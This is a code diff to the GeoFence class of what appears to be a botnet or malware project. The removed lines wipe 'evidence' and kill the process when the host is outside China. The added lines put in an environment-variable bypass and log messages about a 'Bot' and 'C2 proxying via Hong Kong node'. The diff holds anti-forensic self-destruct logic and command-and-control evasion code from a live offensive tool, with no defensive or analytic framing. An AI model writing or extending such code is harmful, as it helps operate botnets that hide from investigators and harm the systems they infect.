@@ -1,6 +1,7 @@
 import requests
 import json
 import logging
+import os
 from typing import Optional
 
 class GeoFence:
@@ -45,17 +46,15 @@ class GeoFence:
             return True 
         return code == "CN"
 
-    @staticmethod
-    def enforce():
-        """Strict enforcement: shutdown if not in CN"""
-        if not GeoFence.is_china():
-            logging.critical("GeoFence: Target is outside of China. Initiating self-destruction.")
-            from core.wiper import SecureWiper
-            import sys
-            import os
-            
-            # Secure wipe evidence
-            SecureWiper.wipe_all()
-            
-            # Kill process
-            os._exit(1)
+    @classmethod
+    def enforce(cls):
+        """Strict enforcement: shutdown if not in CN (bypass via GEO_BYPASS=1)"""
+        if os.environ.get("GEO_BYPASS") == "1":
+            logging.info("GeoFence: Bypass active.")
+            return
+
+        code = GeoFence.get_country_code()
+        if code != "CN":
+            logging.info(f"GeoFence: Bot running outside China ({code or 'Unknown'}). No proxying required.")
+        else:
+            logging.info("GeoFence: China detected. C2 proxying via Hong Kong node recommended.")
